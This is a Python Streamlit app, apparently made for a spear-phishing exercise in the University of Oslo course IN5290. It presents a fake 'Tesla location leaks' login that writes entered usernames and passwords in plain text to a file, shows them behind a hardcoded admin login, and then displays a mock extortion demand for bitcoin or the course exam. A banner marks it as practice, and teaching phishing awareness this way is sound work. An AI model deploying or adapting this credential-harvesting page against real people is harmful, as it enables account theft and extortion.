# URL: https://in5290phishingapptobiasao-8chmrmxwqfrgbperbhdvj3.streamlit.app/
import os

import pandas as pd
import streamlit as st

CREDENTIALS_FILENAME = "captured_credentials.txt"


def init_app():
    if not os.path.exists(CREDENTIALS_FILENAME):  # Create empty file if it does not already exist
        with open(CREDENTIALS_FILENAME, "w") as _:
            pass

    WARNING_MESSAGE = "This is a spear phishing email practice (IN5290 UiO).\n "
    WARNING_MESSAGE += "Do not type in your real password. "
    st.warning(WARNING_MESSAGE)


def load_secret_locations():
    data = pd.DataFrame({
        "latitude": [59.9398, 59.9681, 59.9270],
        "longitude": [10.7211, 10.6989, 10.7498],
        "name": ["University of Oslo", "Vettakollen", "Tesla Store"]
    })
    message = """
    Hello Lazlo. The following Tesla location has been leaked:

    - University of Oslo
    - Vettakollen
    - Tesla store
    """
    st.markdown(message)
    st.map(data)
    message = """
    In order to prevent the hackers to make this data public, please transfer **20** bitcoin to the following address:
    *http://3cpo.hackingarena.com:805/index.php?fruit=banana*
    """
    st.markdown(message)
    st.success("Special discount (only for Lazlo)!")
    message = """
    Since the benevelant hackers knew that a poor university professor can not afford to pay 20 bitcoin, they have
    a limited very special offer. Please send the school exam with the solution in IN5290 autumn 2024 within
    *1st of December* to the email that notified you of the leak, in order to get prevent your sensitive smart car data
    to go public!

    Please act fast to save the starving children in need!
    """
    st.markdown(message)


def load_form():
    with st.form(key="login_form"):
        username = st.text_input("Username")
        password = st.text_input("Password", type="password")
        submit_button = st.form_submit_button(label="Login")

    if submit_button:
        if username and password:
            if username == "admin" and password == "admin_password":
                st.write("Secrets:")
                with open(CREDENTIALS_FILENAME, "r") as infile:
                    for line in infile:
                        st.write(line)
            else:
                with open(CREDENTIALS_FILENAME, "a") as outfile:
                    outfile.write(f"Username: {username}, Password: {password}\n")
                st.success(f"Login successful! Welcome {username}!")
                return True
        else:
            st.warning("Please enter both username and password.")
    return False


def main():
    init_app()
    with st.container():
        st.title("Tesla location leaks overview")
        message = "Please log in with your email and password to see potential data breaches that was made public "
        message += "from your smart car. "
        st.write(message)
    with st.container():
        successful_login = load_form()
        if successful_login:
            load_secret_locations()


if __name__ == "__main__":
    main()
